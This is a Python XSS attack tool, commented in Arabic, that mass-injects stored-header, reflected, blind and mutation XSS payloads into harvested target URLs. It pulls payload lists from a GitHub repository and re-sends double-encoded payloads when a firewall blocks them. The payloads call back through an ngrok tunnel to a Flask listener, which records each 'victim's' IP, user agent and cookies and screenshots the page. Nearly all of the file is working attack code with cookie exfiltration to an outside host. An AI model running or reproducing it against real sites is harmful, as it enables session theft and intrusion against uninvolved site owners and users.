import requests, time, threading, json, os, subprocess, re, random
from flask import Flask, request
from urllib.parse import urljoin, quote, urlparse
import pandas as pd
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from webdriver_manager.chrome import ChromeDriverManager

# --- [ الإعدادات والمجلدات ] ---
NGROK_PATH = r"C:\Users\malek\Desktop\ngrok\ngrok.exe"
XSS_DIRS = ["Stored XSS Header", "Reflected XSS", "DOM-Based XSS", "Blind XSS", "Mutation XSS", "XSS_Screenshots"]
for d in XSS_DIRS:
    if not os.path.exists(d): os.makedirs(d)

# ملفات الأهداف من المرحلة الثانية
TARGET_FILES = [
    "path_from_states_200.txt", "path_from_states_403.txt", "path_from_states_404.txt",
    "path_from_states_500.txt", "path_from_401_pass_username.txt", 
    "path_from_401_generation_ips_localhost.txt", "path_from_405_request_method_type.txt",
    "path_from_503_states.txt", "path_from_206.txt", "path_from_301_302.txt", "path_from_states_201.txt"
]

app = Flask(__name__)
CALLBACK_URL = ""

# --- [ 1. محرك تصوير الشاشة (Screenshot Engine) ] ---

def take_screenshot(target_url, filename):
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    try:
        driver = webdriver.Chrome(options=chrome_options)
        driver.set_page_load_timeout(15)
        driver.get(target_url)
        time.sleep(3) # وقت لضمان تنفيذ الجافا سكربت
        path = os.path.join("XSS_Screenshots", f"{filename}.png")
        driver.save_screenshot(path)
        driver.quit()
        return path
    except:
        return "Screenshot Failed"

# --- [ 2. المستقبل (The Ninja Listener) ] ---

@app.route('/log', methods=['GET'])
def listener():
    target_url = request.args.get('u', 'Unknown')
    payload = request.args.get('p', 'Unknown')
    clean_name = re.sub(r'[\\/*?:"<>|]', '_', urlparse(target_url).netloc + urlparse(target_url).path)
    
    # التقاط الصورة فور وصول التنبيه
    screenshot_path = take_screenshot(target_url, clean_name)

    data = {
        "Time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "Victim_IP": request.remote_addr,
        "User_Agent": request.headers.get('User-Agent'),
        "Cookies": request.args.get('c'),
        "URL": target_url,
        "Payload": payload,
        "Screenshot": screenshot_path,
        "Exploitation_Steps": [
            "1. Visit the vulnerable link directly.",
            f"2. Payload injected: {payload}",
            "3. Data was exfiltrated to the listener via Ngrok."
        ]
    }
    log_path = os.path.join("Stored XSS Header", "victims_logs.json")
    logs = []
    if os.path.exists(log_path):
        try:
            with open(log_path, 'r') as f: logs = json.load(f)
        except: logs = []
    logs.append(data)
    with open(log_path, 'w') as f: json.dump(logs, f, indent=4)
    print(f"\n[!!!] XSS TRIGGERED on: {target_url}")
    return "OK", 200

# --- [ 3. محرك التجاوز والفحص (The Core Scanner) ] ---

def encode_payload(payload, level):
    if level == "url": return quote(payload)
    if level == "double": return quote(quote(payload))
    if level == "hex": return "".join([hex(ord(c)).replace("0x", "%") for c in payload])
    return payload

class XSSScanner:
    def __init__(self, targets, callback):
        self.targets = targets
        self.callback = callback

    def save_excel(self, folder, filename, data):
        path = os.path.join(folder, filename)
        df = pd.DataFrame([data])
        if not os.path.isfile(path):
            df.to_excel(path, index=False)
        else:
            with pd.ExcelWriter(path, mode='a', engine='openpyxl', if_sheet_exists='overlay') as writer:
                df.to_excel(writer, index=False, header=False, startrow=writer.book['Sheet1'].max_row)

    # 1. Stored XSS Header
    def scan_stored_headers(self, headers_list, payloads):
        print("[*] Starting Stored XSS Header Injection...")
        for url in self.targets:
            for h in headers_list:
                for p in payloads:
                    final_p = p.replace("CALLBACK_URL", f"{self.callback}/log?u={url}&p={quote(p)}")
                    headers = {h: final_p}
                    try:
                        res = requests.get(url, headers=headers, timeout=10)
                        if res.status_code in [403, 406]:
                            headers[h] = encode_payload(final_p, "double")
                            requests.get(url, headers=headers, timeout=10)
                    except: continue

    # 2. Reflected XSS
    def scan_reflected(self, payloads):
        print("[*] Starting Reflected XSS Scanning...")
        for url in self.targets:
            if "?" in url:
                for p in payloads:
                    test_url = f"{url}&reflected_test={quote(p)}"
                    try:
                        res = requests.get(test_url, timeout=10)
                        if p in res.text:
                            self.save_excel("Reflected XSS", "ReflectedXSSResult.xlsx", {"Vulnerable_URL": url, "Payload": p, "Source": "Reflected_Param"})
                    except: continue

    # 3. DOM-Based XSS
    def scan_dom(self, dom_payloads):
        print("[*] Starting DOM-Based Static Analysis...")
        patterns = [r"eval\(", r"setTimeout\(", r"innerHTML", r"document.write\(", r"location.hash"]
        for url in self.targets:
            try:
                res = requests.get(url, timeout=10)
                scripts = re.findall(r'src=["\'](.*?\.js)["\']', res.text)
                for js in scripts:
                    js_url = urljoin(url, js)
                    js_content = requests.get(js_url).text
                    for pat in patterns:
                        if re.search(pat, js_content):
                            self.save_excel("DOM-Based XSS", "DOMBasedXSSResult.xlsx", {"Vulnerable_URL": url, "JS_File": js_url, "Sink": pat})
            except: continue

    # 4. Blind XSS
    def scan_blind(self, paths, payloads):
        print("[*] Starting Blind XSS (OOB) Injection...")
        for url in self.targets:
            parsed = urlparse(url)
            base = f"{parsed.scheme}://{parsed.netloc}"
            for path in paths:
                target = urljoin(base, path)
                for p in payloads:
                    final_p = p.replace("CALLBACK_URL", f"{self.callback}/log?u={target}&p={quote(p)}")
                    try:
                        requests.post(target, data={"comment": final_p, "msg": final_p, "email": "xss@test.com"}, timeout=5)
                    except: continue

    # 5. Mutation XSS
    def scan_mutation(self, payloads):
        print("[*] Starting Mutation XSS Scanning...")
        for url in self.targets:
            for p in payloads:
                test_url = f"{url}?m={quote(p)}"
                try: requests.get(test_url, timeout=5)
                except: continue

# --- [ 4. وظيفة التشغيل الرئيسية ] ---

def start_ngrok():
    global CALLBACK_URL
    print("[*] Connecting to Ngrok...")
    subprocess.Popen([NGROK_PATH, "http", "5000"], stdout=subprocess.DEVNULL)
    time.sleep(7)
    try:
        res = requests.get("http://127.0.0.1:4040/api/tunnels").json()
        CALLBACK_URL = res['tunnels'][0]['public_url']
        print(f"[+] Ngrok Tunnel Active: {CALLBACK_URL}")
        return CALLBACK_URL
    except:
        print("[-] Ngrok failed. Check Authtoken."); return None

def run_xss_phase():
    # 1. جمع الأهداف
    all_targets = []
    for f_name in TARGET_FILES:
        if os.path.exists(f_name):
            with open(f_name, 'r') as f:
                all_targets.extend([l.strip() for l in f if l.strip()])
    targets = list(set(all_targets))
    if not targets: print("[-] No targets found!"); return

    # 2. تشغيل الـ Listener
    threading.Thread(target=lambda: app.run(port=5000, use_reloader=False, threaded=True)).start()
    
    # 3. تشغيل Ngrok
    callback = start_ngrok()
    if not callback: return

    # 4. تحميل القوائم
    def load(url): return requests.get(url).text.splitlines()
    h_list = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_xss_stored_header_injection.txt")
    s_p = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/lsit_xss_stored_pyaload_Header_inj.txt")
    r_p = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_xss_Reflected_payalod.txt")
    d_p = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_XSS_DOM_payloads.txt")
    b_path = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_Blind_XSS_path.txt")
    b_pay = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_Blind_XSS_Payloads.txt")
    m_p = load("https://raw.githubusercontent.com/malekAbuliala/List-s-me/refs/heads/main/list_mXSS_Payloads.txt")

    # 5. بدء الفحص
    scanner = XSSScanner(targets, callback)
    scanner.scan_stored_headers(h_list, s_p)
    scanner.scan_reflected(r_p)
    scanner.scan_dom(d_p)
    scanner.scan_blind(b_path, b_pay)
    scanner.scan_mutation(m_p)

if __name__ == "__main__":
    run_xss_phase()
